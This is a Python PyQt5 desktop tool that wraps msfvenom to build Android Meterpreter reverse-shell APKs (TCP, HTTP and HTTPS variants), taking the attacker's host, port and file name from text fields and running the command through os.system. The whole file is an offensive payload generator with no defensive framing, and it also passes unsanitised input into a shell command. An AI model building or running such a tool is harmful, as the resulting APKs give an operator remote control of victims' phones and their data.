import sys
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5 import uic
from PyQt5.QtWidgets import QMessageBox
import os

values = [
    'android/meterpreter/reverse_tcp',
    'android/meterpreter/reverse_http',
    'android/meterpreter/reverse_https',
]

base_command = f'msfvenom -p %s LHOST=%s LPORT=%d R > %s'


def show_message(title='Error', info="", text='An Error Occured'):
    msg = QMessageBox()
    msg.setIcon(QMessageBox.Critical)
    msg.setText(text)
    msg.setInformativeText(info)
    msg.setWindowTitle(title)
    msg.exec_()

class MainWindow(QtWidgets.QMainWindow):

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        uic.loadUi("payload_generater.ui", self)
        self.btnGeneratePayload.clicked.connect(self.click_generate)
        self.payloadComboBox.addItems(values)
        self.output_dir = str(os.getcwd())+'/payloads/'
        print(self.output_dir)
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

    def click_generate(self):
        try:
            host = str(self.textHost.toPlainText())
            port = str(self.textPort.toPlainText())
            payload_name = str(self.textName.toPlainText())
            if 'apk' not in payload_name:
                payload_name = payload_name+'.apk'
            payload_type = str(self.payloadComboBox.currentText())


            if host and port and payload_name and payload_type:
                port = int(port)
                output_path = self.output_dir+payload_name
                command = base_command % (payload_type, host, port, output_path)
                print(command)
                os.system(command)
                show_message(title='Success', text='Successfully generated payload, please find it at below path', info=self.output_dir)
            else:
                show_message(text='All fields are mandatory, please click generate after putting those.')

        except Exception as e:
            print(e)
            show_message(info=str(e))


def main():
    app = QtWidgets.QApplication(sys.argv)
    main = MainWindow()
    main.show()
    sys.exit(app.exec_())

if __name__ == '__main__':
    main()
